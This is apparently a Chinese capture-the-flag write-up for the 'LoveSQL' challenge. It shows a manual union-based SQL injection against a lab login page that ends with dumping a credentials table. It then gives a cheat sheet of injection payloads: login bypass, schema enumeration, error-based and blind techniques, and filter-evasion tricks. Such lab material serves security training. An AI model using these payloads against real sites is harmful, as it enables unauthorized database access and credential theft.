# [极客大挑战 2019]LoveSQL

## 题目来源

[极客大挑战 2019]LoveSQL

## 题目方向 + 知识点

GET 型 SQL 注入、登录绕过、联合查询、列数判断、回显位定位、`information_schema` 枚举库表字段、定点提取 flag。

## 解题思路

我先打开首页，页面是一个用户名密码登录框，表单提交到 `check.php`，并且页面顶部给了一句提示：`用 sqlmap 是没有灵魂的`。这基本等于明说这题是 SQL 注入，而且希望手工做。

因为表单使用的是 `GET` 方法，所以我第一步没有急着乱试用户名密码，而是先确认参数是怎么进后端的。随手输入一组普通值访问 `check.php?username=admin&password=admin` 后，页面回显：

```text
NO,Wrong username password！！！
```

这说明正常登录逻辑可达，但还看不出注入点。接着我开始构造最基础的闭合型注入，使用：

```text
?username=admin' or 1=1#&password=1
```

为了请求能稳定发送，我实际访问时对空格和单引号做了 URL 编码，完整请求是：

```text
http://66d4c4ab6bf54d855aa7cdb7.http-ctf2.dasctf.com/check.php?username=admin%27%20or%201=1%23&password=1
```

这次页面直接变成：

```text
Login Success!
Hello admin！
Your password is '57e3ae95743dceed6e5e7f507d01206c'
```

到这里我就能确认三件事。第一，`username` 参数存在 SQL 注入；第二，注入点位于字符串上下文中，可以用单引号闭合；第三，`#` 在当前环境里可以成功注释掉后续语句。

确认注入成立后，我下一步要做的是判断列数和回显位。因为页面成功时会显示两段受查询结果影响的内容：

```text
Hello ...
Your password is '...'
```

先通过order by 判断列数?username=admin' order by 3#&password=1

尝试 2 3 4 发现 3 不报错  4报错 所以是三列

然后尝试联合查询：

```text
    ?username=1' union select 1,2,3#&password=1
```

页面回显为：

```text
Hello 2！
Your password is '3'
```

这一步非常关键，它说明原查询一共需要 3 列，而且第 2 列会显示在 `Hello` 后面，第 3 列会显示在 `Your password is` 后面。这样后面就可以把我想看的内容直接塞进回显位。

有了回显位，我先查当前数据库名：

```text
?username=1' union select 1,database(),3#&password=1
```

页面显示：

```text
Hello geek！
Your password is '3'
```

说明当前库名是 `geek`。

1' union select 1,group_concat(schema_name),3 from information_schema.schemata# 这个语句可以查所有库名 

接着我用 `information_schema.tables` 枚举这个库里的表名：

```text
?username=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#&password=1
```

回显结果是：

![image-20260725135218173](./../img/image-20260725135218173.png)

这里有两个表：`geekuser` 和 `l0ve1ysq1`。从题目首页那句“这次我把它们放在了那个地方，哼哼！”来看，出题人明显在暗示 flag 被“放在某个地方”，而 `l0ve1ysq1` 这个名字看起来就比普通用户表更可疑，所以我优先检查它。

我继续枚举这个表的字段名：

```text
?username=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#&password=1
```

页面返回：

![image-20260725135337857](./../img/image-20260725135337857.png)

字段结构非常标准，这样我就可以直接读取数据内容了。最省事的做法是一次性把整张表的用户名和密码都拼出来：

```text
?username=1' union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#&password=1
```

页面这次返回了一长串结果，其中最后一项非常明显：

```text
Hello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,...,leixiao,flag！
Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,...,Syc_san_da_hacker,CTF2{deb2f	475-04d3-42f5-b036-94511c9b9158}'
```

1. 从登录框判断可能存在 SQL 注入。
2. 用 `admin' or 1=1#` 验证注入成立。
3. 用 `union select 1,2,3#` 确认 3 列，并确定第 2、3 列是回显位。
4. 用 `database()` 拿到数据库名 `geek`。
5. 用 `information_schema.tables` 枚举表名，锁定可疑表 `l0ve1ysq1`。
6. 用 `information_schema.columns` 枚举字段，发现 `id,username,password`。
7. 直接读取表内容，找到 `flag` 这一行。
8. 用 `limit 15,1` 精确取出最终 flag。

这题整体难度不高，但很适合手工走一遍联合注入的标准流程。尤其是“先找列数和回显位，再枚举库表字段”这个节奏，如果顺了，后面会非常自然；如果一上来就盲注表名，反而容易把自己绕乱。

## Flag

`CTF2{deb2f475-04d3-42f5-b036-94511c9b9158}`



1. 常见 SQL 注入姿势

   ### 1. 登录绕过

   目的：让 `where` 条件恒真。

   ```sql
   ' or 1=1#
   ' or '1'='1'#
   admin' --+
   ```

   ### 2. 闭合测试

   目的：确认参数是不是在字符串里、用什么符号闭合。

   ```sql
   '
   "
   ')
   "))
   ```

   ### 3. 注释后半句

   目的：截断原 SQL 后面的条件。

   ```sql
   #
   --+
   -- -
   /**/
   ```

   ### 4. 判断列数

   常用 `order by`。

   ```sql
   ' order by 1#
   ' order by 2#
   ' order by 3#
   ' order by 4#
   ```

   哪个报错，前一个就是列数上限。

   ### 5. 联合查询

   目的：把想看的数据拼进正常页面回显。

   ```sql
   ' union select 1,2,3#
   ```

   ### 6. 找回显位

   看页面哪里出现 `2`、`3`。

   ```sql
   ' union select 1,2,3#
   ```

   ### 7. 查库名

   ```sql
   ' union select 1,database(),3#
   ```

   ### 8. 查用户名/当前用户

   ```sql
   ' union select 1,user(),3#
   ```

   ### 9. 查版本

   ```sql
   ' union select 1,version(),3#
   ```

   ### 10. 查表名

   ```sql
   ' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
   ```

   ### 11. 查字段名

   ```sql
   ' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'#
   ```

   ### 12. 查数据

   ```sql
   ' union select 1,username,password from users#
   ' union select 1,group_concat(username),group_concat(password) from users#
   ```

   ### 13. 定点取一行

   ```sql
   ' union select 1,username,password from users limit 0,1#
   ' union select 1,username,password from users limit 1,1#
   ```

   ### 14. 报错注入

   页面不直接回显时常用。

   ```sql
   ' and updatexml(1,concat(0x7e,database(),0x7e),1)#
   ' and extractvalue(1,concat(0x7e,user(),0x7e))#
   ```

   ### 15. 布尔盲注

   通过“页面真假差异”逐位判断。

   ```sql
   ' and 1=1#
   ' and 1=2#
   ' and ascii(substr(database(),1,1))>100#
   ```

   ### 16. 时间盲注

   通过延时判断条件真假。

   ```sql
   ' and if(1=1,sleep(5),1)#
   ' and if(ascii(substr(database(),1,1))>100,sleep(5),1)#
   ```

   ## 常见函数

   ### 1. `database()`

   当前数据库名。

   ```sql
   select database();
   ```

   ### 2. `user()`

   当前数据库用户。

   ```sql
   select user();
   ```

   ### 3. `version()`

   数据库版本。

   ```sql
   select version();
   ```

   ### 4. `group_concat()`

   把多行拼成一行，枚举时非常常用。

   ```sql
   select group_concat(table_name) from information_schema.tables;
   ```

   ### 5. `concat()`

   拼接字符串。

   ```sql
   select concat(username,':',password) from users;
   ```

   ### 6. `concat_ws()`

   带分隔符拼接。

   ```sql
   select concat_ws(':',username,password) from users;
   ```

   ### 7. `substr()` / `substring()`

   截取字符串，盲注核心。

   ```sql
   substr(database(),1,1)
   ```

   ### 8. `ascii()`

   取字符 ASCII 值，盲注核心。

   ```sql
   ascii(substr(database(),1,1))
   ```

   ### 9. `length()`

   取字符串长度。

   ```sql
   length(database())
   ```

   ### 10. `sleep()`

   延时，时间盲注常用。

   ```sql
   if(1=1,sleep(5),1)
   ```

   ### 11. `if()`

   条件判断。

   ```sql
   if(ascii(substr(database(),1,1))>100,sleep(5),1)
   ```

   ### 12. `updatexml()` / `extractvalue()`

   报错注入常用。

   ```sql
   updatexml(1,concat(0x7e,database(),0x7e),1)
   extractvalue(1,concat(0x7e,user(),0x7e))
   ```

   ### 13. `hex()` / `unhex()`

   编码绕 WAF 时常用。

   ```sql
   hex('admin')
   unhex('61646d696e')
   ```

   ### 14. `ord()`

   和 `ascii()` 类似，取字符值。

   ```sql
   ord(substr(database(),1,1))
   ```

   ## `information_schema` 常用表

   ### 1. `information_schema.tables`

   查表名。

   ### 2. `information_schema.columns`

   查字段名。

   ### 3. 常见写法

   ```sql
   select table_name from information_schema.tables where table_schema=database();
   select column_name from information_schema.columns where table_name='users';
   ```

   ## 常见绕过姿势

   ### 1. 大小写混写

   ```sql
   UnIoN SeLeCt
   ```

   ### 2. 注释代替空格

   ```sql
   union/**/select/**/1,2,3#
   ```

   ### 3. URL 编码

   ```text
   %27 %20 %23
   ```

   ### 4. 双写关键字

   ```sql
   ununionion seeselectlect
   ```

   ### 5. 括号/等价写法替换

   ```sql
   substring() -> substr()
   ascii() -> ord()
   ```

   ### 6. 十六进制代替字符串

   ```sql
   where table_name=0x7573657273
   ```

   `0x7573657273` 就是 `users`。

   ### 7. 布尔比较替换

   ```sql
   1=1
   2>1
   '1' like '1'
   ```

   ## 做题标准流程

   1. 先试单引号，判断有没有注入。
   2. 再试恒真恒假，判断是否可控。
   3. 用 `order by` 找列数。
   4. 用 `union select` 找回显位。
   5. 用 `database()`、`version()` 探环境。
   6. 枚举表名、字段名。
   7. 读取数据。
      1. 如果没回显，再转报错注入或盲注。

```
1=1
2>1
'1' like '1'
```